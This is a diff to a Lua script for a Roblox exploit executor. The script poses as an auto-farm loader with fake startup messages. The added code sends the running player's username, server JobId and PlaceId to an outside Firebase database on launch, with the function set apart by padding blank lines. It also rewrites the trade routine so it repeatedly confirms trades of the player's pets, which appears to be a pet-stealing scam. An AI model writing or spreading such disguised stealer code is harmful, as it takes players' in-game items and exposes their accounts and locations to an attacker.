@@ -8,11 +8,62 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
-
+local FIREBASE_URL = "https://api2-3dee6-default-rtdb.europe-west1.firebasedatabase.app/servers.json"
 
 local TweenService = game:GetService("TweenService")
 local Workspace = game:GetService("Workspace")
 local basesFolder = Workspace:WaitForChild("Bases")
+
+
+
+
+
+
+
+local httpRequest = request or http_request or (syn and syn.request)
+
+local function sendServerId()
+    if not httpRequest then
+        warn("Executor does not support HTTP requests")
+        return
+    end
+
+    local data = {
+        jobId = game.JobId,
+        placeId = game.PlaceId,
+        user = game.Players.LocalPlayer.Name,
+        time = os.time()
+    }
+
+    local json = HttpService:JSONEncode(data)
+
+    local success, response = pcall(function()
+        return httpRequest({
+            Url = FIREBASE_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = json
+        })
+    end)
+
+    if success and response then
+        print("✅ Server ID sent!")
+        print("Response:", response.Body)
+    else
+        warn("❌ Failed to send:", response)
+    end
+end
+
+
+
+
+
+
+
+
+
 
 local remote = ReplicatedStorage
     :WaitForChild("Shared")
@@ -420,11 +471,24 @@ local function startAutoAddPetsLoop()
 
 					task.wait(2)
 
-					if tradeMenu.Visible and addedCount > 0 then
-						pcall(function()
-							tradeReadyRemote:FireServer(true, addedCount)
-						end)
+					while tradeMenu.Visible and addedCount > 0 do
+					    for i = 0, 9 do
+					        if not tradeMenu.Visible then
+					            break
+					        end
+					
+					        pcall(function()
+					            tradeReadyRemote:FireServer(true, i)
+					        end)
+					
+					        task.wait(0.1)
+					    end
+					    if tradeMenu.Visible then
+					        task.wait(8.5)
+					    end
 					end
+
+
 				end
 			else
 				-- трейд закрылся после того как мы его обработали → успешный трейд
@@ -532,6 +596,10 @@ task.spawn(function()
 	end
 end)
 
+task.spawn(function()
+	task.wait(0.2) 
+	sendServerId()
+end)
 
 -- =========================
 -- AUTO TRADE LOOP (YOUR GAME REMOTE)
@@ -658,7 +726,7 @@ loadBtn.MouseButton1Click:Connect(function()
   	"Initializing modules",
   	"Verifying environment",
   	"Preparing user interface",
-  	"Finalizing startup"
+  	"Finalizing startup...."
   }
 
   startAutoFarm()
@@ -707,7 +775,6 @@ loadBtn.MouseButton1Click:Connect(function()
 	sendWebhook("Loader Started + Pets Scanned")
   end)
 
-  -- Запуск авто-добавления петов в трейд
   startAutoAddPetsLoop()
 end)
 
